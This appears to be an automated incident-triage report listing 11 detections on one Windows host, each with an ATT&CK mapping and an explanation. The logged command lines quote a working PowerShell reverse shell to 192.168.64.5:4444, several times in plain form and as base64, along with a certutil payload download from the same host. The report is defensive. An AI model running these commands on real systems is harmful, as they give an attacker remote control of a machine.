# Incident Report: Automated triage

**Generated:** 2026-09-07T02:17:15Z
**Detections fired:** 11

## Summary

11 detection(s) fired. Highest severity: **high**.

## Findings

### 1. Whoami Execution (Discovery)  (`bf-0003`)

- **Severity:** medium
- **MITRE ATT&CK:** T1033
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 01:41:33.225000+00:00
- **Process:** `C:\\Windows\\System32\\whoami.exe`
- **Command line:** `\"C:\\WINDOWS\\system32\\whoami.exe\"`
> whoami is run by attackers right after gaining access to understand their privileges. Rare on user workstations outside of IT activity.
### 2. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:04:13.050000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \" = New-Object System.Net.Sockets.TCPClient('192.168.64.5',4444); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String ); =  + 'PS ' + (pwd).Path + '&gt; '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()\"`
- **Extracted IOCs:** System.Net.Sockets.TCPClient, System.Text.ASCIIEncoding, text.encoding
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 3. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:04:55.811000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \" = New-Object System.Net.Sockets.TCPClient('192.168.64.5',4444); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String ); =  + 'PS ' + (pwd).Path + '&gt; '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()\"`
- **Extracted IOCs:** System.Net.Sockets.TCPClient, System.Text.ASCIIEncoding, text.encoding
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 4. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:05:19.751000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \" = New-Object System.Net.Sockets.TCPClient('192.168.64.5',4444); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String ); =  + 'PS ' + (pwd).Path + '&gt; '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()\"`
- **Extracted IOCs:** System.Net.Sockets.TCPClient, System.Text.ASCIIEncoding, text.encoding
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 5. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:06:37.545000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient(\"192.168.64.5\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"`
- **Extracted IOCs:** System.Net.Sockets.TCPClient, System.Text.ASCIIEncoding, bytes.Length, client.Close, client.GetStream, sendbyte.Length, stream.Flush, stream.Read, stream.Write, text.encoding
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 6. Suspicious PowerShell Encoded Command  (`bf-0001`)

- **Severity:** high
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:09:01.532000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`
> PowerShell launched with an encoded command (-enc / -EncodedCommand). Attackers base64-encode payloads to hide intent and bypass simple string-based controls.
### 7. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:09:01.532000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 8. Suspicious PowerShell Encoded Command  (`bf-0001`)

- **Severity:** high
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:09:14.195000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`
> PowerShell launched with an encoded command (-enc / -EncodedCommand). Attackers base64-encode payloads to hide intent and bypass simple string-based controls.
### 9. PowerShell Suspicious Execution Flags  (`bf-0004`)

- **Severity:** medium
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:09:14.195000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`
> Combinations like -nop -w hidden and download cradles (IEX, DownloadString) are strong signals of a malicious PowerShell run.
### 10. Whoami Execution (Discovery)  (`bf-0003`)

- **Severity:** medium
- **MITRE ATT&CK:** T1033
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:10:51.665000+00:00
- **Process:** `C:\\Windows\\System32\\whoami.exe`
- **Command line:** `\"C:\\WINDOWS\\system32\\whoami.exe\"`
> whoami is run by attackers right after gaining access to understand their privileges. Rare on user workstations outside of IT activity.
### 11. Certutil Used to Download a File  (`bf-0002`)

- **Severity:** high
- **MITRE ATT&CK:** T1105, T1218
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-09-07 02:15:45.179000+00:00
- **Process:** `C:\\Windows\\System32\\certutil.exe`
- **Command line:** `\"C:\\WINDOWS\\system32\\certutil.exe\" -urlcache -split -f http://192.168.64.5:8000/payload.txt C:\\Users\\Fable\\payload.txt`
- **Extracted IOCs:** http://192.168.64.5:8000/payload.txt
> certutil.exe is a signed Windows binary (a LOLBIN) abused to download remote payloads while looking legitimate. Downloading over http with -urlcache is a classic ingress-tool-transfer pattern.

## Recommended next steps

1. Validate whether the activity is expected for this host and user.
2. Pivot on the extracted IOCs (reputation lookups, other hosts touching them).
3. If confirmed malicious, isolate the host and follow the relevant playbook in `docs/`.